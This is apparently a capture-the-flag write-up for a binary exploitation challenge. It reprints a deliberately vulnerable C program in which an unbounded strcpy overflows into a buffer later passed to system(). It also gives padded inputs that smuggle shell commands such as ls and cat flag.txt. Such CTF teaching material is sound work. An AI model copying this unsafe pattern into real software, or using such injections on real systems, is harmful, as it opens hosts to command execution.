## ‚öôÔ∏è Input Injection 1
**Category:** Binary Exploitation

**Files/Links Provided:** ```vuln.c```, ```vuln```


**Description:**  

```
A friendly program wants to greet you‚Ä¶ but its goodbye
might say more than it should. Can you convince it to
reveal the flag?
```

**Steps to Solve:**  
1. Download ```vuln.c``` and open it in a text/code editor.
2. Connect to the challenge instance ```nc <host> <port>```.
3. Try a test input which reveals that ```system()``` is executed with the command ```uname```, which outputs Linux, the host's OS.
4. Use an input such as ```0123456789echo "injection"``` (10 padding bytes + command) which echos injection to the terminal, verifying the vulnerability.
5. Reconnect to the server then input ```0123456789ls``` which reveals ```flag.txt```.
6. Display the flag using the input ```0123456789cat flag.txt``` which will output the flag to the terminal.

**Explanation:**

Looking at the provided source code, ```fgets(name, sizeof(name), stdin)``` allows for up to 199 bytes of input but ```fun()``` copies the input using ```strcpy() (no bounds checking)``` into buffer which is 10 bytes, so an input >10 bytes will overflow the buffer. The overflowing of the buffer causes c to be overwritten where later in the code ```system(c);``` is called allowing for system commands to be executed.

**Code / Commands / Images**

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h> 

void fun(char *name, char *cmd);

int main() {
    char name[200];
    printf("What is your name?\n");
    fflush(stdout);


    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = 0;

    fun(name, "uname");
    return 0;
}

void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];

    strcpy(c, cmd);
    strcpy(buffer, name);

    printf("Goodbye, %s!\n", buffer);
    fflush(stdout);
    system(c);
}

```
> Original vuln.c source code.

[üè† Back to Main Page](https://github.com/Greenest-Guy/CMU-Africa-picoMini-Writeup)
